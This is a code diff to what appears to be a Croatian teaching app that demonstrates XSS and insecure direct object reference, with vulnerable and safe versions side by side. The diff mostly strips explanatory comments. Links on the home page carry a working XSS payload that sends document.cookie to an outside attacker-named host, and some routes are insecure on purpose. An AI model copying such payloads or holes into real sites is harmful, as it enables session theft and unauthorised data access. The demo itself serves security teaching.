@@ -9,7 +9,6 @@ USERS = {
     "2": {"username": "nika",  "podaci": "Nikina tajna poruka / privatni podaci"},
 }
 
-# zajednicki CSS da sve stranice lijepo izgledaju
 STYLE = """
 <style>
   body {
@@ -70,7 +69,7 @@ HOME_HTML = """
     <h1>Demo za XSS</h1>
     <p><b>Odaberite jednu od opcija:</b></p>
     <a class="btn" style="background:#dc2626" href='/nesigurno?ime=<img src=x onerror="new Image().src=%27https://drugi-projekt-security-napadac.onrender.com/log?c=%27%2Bdocument.cookie">'>RANJIVO (XSS)</a>
-<a class="btn" style="background:#16a34a" href='/sigurno?ime=<img src=x onerror="new Image().src=%27https://drugi-projekt-security-napadac.onrender.com/log?c=%27%2Bdocument.cookie">'>SIGURNO (bez XSS)</a>
+    <a class="btn" style="background:#16a34a" href='/sigurno?ime=<img src=x onerror="new Image().src=%27https://drugi-projekt-security-napadac.onrender.com/log?c=%27%2Bdocument.cookie">'>SIGURNO (bez XSS)</a>
   </div>
 </body></html>
 """
@@ -118,7 +117,6 @@ HTML_SIGURNO="""
     const params = new URLSearchParams(location.search);
     const ime = params.get("ime") || "gost";
 
-    // SIGURNO: korisnički ulaz ide kao čisti tekst, ne kao HTML
     document.getElementById("pozdrav").textContent = "Pozdrav, " + ime;
   </script>
 </body>
@@ -142,7 +140,6 @@ HTML_NESIGURNO="""
     const params = new URLSearchParams(location.search);
     const ime = params.get("ime") || "gost";
 
-    // RANJIVO: korisnički ulaz ide direktno u DOM kao HTML
     document.getElementById("pozdrav").innerHTML = "Pozdrav, " + ime;
   </script>
 </body>
@@ -181,7 +178,6 @@ def dashboard():
                                    result=None, ok=False)
 
 
-# RANJIVO: ne provjerava pripada li profil ulogiranom korisniku
 @app.route("/profile-vuln/<user_id>")
 def profile_vuln(user_id):
     podaci = USERS[user_id]["podaci"]
@@ -190,7 +186,6 @@ def profile_vuln(user_id):
                                    result=result, ok=False)
 
 
-# SIGURNO: provjerava session['user_id'] prije prikaza
 @app.route("/profile-safe/<user_id>")
 def profile_safe(user_id):
     if session.get("user_id") != user_id:
